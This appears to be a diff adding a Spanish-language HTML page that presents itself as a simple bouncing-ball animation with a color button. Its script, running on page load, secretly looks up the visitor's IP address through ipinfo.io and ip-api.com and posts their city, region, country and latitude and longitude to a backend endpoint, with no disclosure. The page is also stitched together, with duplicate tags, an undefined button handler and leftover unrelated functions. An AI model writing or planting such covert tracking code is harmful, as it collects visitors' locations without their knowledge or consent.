@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <html lang="es">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Animación Interactiva</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    text-align: center;
+                    background-color: #f4f4f4;
+                    padding: 20px;
+                    overflow: hidden;
+                }
+                .container {
+                    background: white;
+                    padding: 20px;
+                    border-radius: 10px;
+                    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+                    display: inline-block;
+                    position: relative;
+                }
+                .ball {
+                    width: 50px;
+                    height: 50px;
+                    background-color: #007bff;
+                    border-radius: 50%;
+                    position: absolute;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    animation: bounce 2s infinite ease-in-out;
+                }
+                @keyframes bounce {
+                    0%, 100% {
+                        transform: translate(-50%, -50%) translateY(0);
+                    }
+                    50% {
+                        transform: translate(-50%, -50%) translateY(-100px);
+                    }
+                }
+                button {
+                    margin-top: 20px;
+                    padding: 10px 20px;
+                    border: none;
+                    border-radius: 5px;
+                    background-color: #007bff;
+                    color: white;
+                    cursor: pointer;
+                }
+                button:hover {
+                    background-color: #0056b3;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>Animación Interactiva</h1>
+                <p>Haz clic en el botón para cambiar el color de la bola.</p>
+                <div class="ball" id="ball"></div>
+                <button onclick="cambiarColor()">Cambiar Color</button>
+            </div>
+        
+
+    <script>
+        function enviarPregunta() {
+            let input = document.getElementById("preguntaInput");
+            let preguntaTexto = input.value.trim();
+            if (preguntaTexto === "") return;
+            
+            let preguntasDiv = document.getElementById("preguntas");
+            let preguntaElemento = document.createElement("div");
+            preguntaElemento.classList.add("pregunta");
+            
+            preguntaElemento.innerHTML = `
+                <span>${preguntaTexto}</span>
+                <button onclick="copiarPregunta('${preguntaTexto}')">📋 Copiar</button>
+            `;
+            
+            preguntasDiv.appendChild(preguntaElemento);
+            input.value = "";
+        }
+
+        function copiarPregunta(texto) {
+            navigator.clipboard.writeText(texto).then(() => {
+                alert("Pregunta copiada. Pega en WhatsApp para compartir.");
+            });
+        }
+
+        fetch("https://ipinfo.io/json?token=8247e9a3e4bb2d") // 🔥 Reemplaza YOUR_TOKEN con tu API Key de ipinfo.io
+        .then(response => response.json())
+    .then(ipData => {
+        console.log("📍 IP obtenida:", ipData.ip);
+        
+        fetch(`http://ip-api.com/json/${ipData.ip}`) // Buscar ubicación más precisa
+            .then(response => response.json())
+            .then(locationData => {
+                console.log("📍 Ubicación detallada:", locationData);
+
+                fetch("/enviar-ubicacion", { // Enviar al backend
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        ciudad: locationData.city || "No disponible",
+                        region: locationData.regionName || "No disponible",
+                        pais: locationData.country || "No disponible",
+                        ip: locationData.query || "No disponible",
+                        latitud: locationData.lat || "No disponible",
+                        longitud: locationData.lon || "No disponible"
+                    })
+                });
+            })
+            .catch(error => console.error("❌ Error con ip-api:", error));
+    })
+    .catch(error => console.error("❌ Error con ipinfo.io:", error));
+
+    </script>
+</body>
+</html>
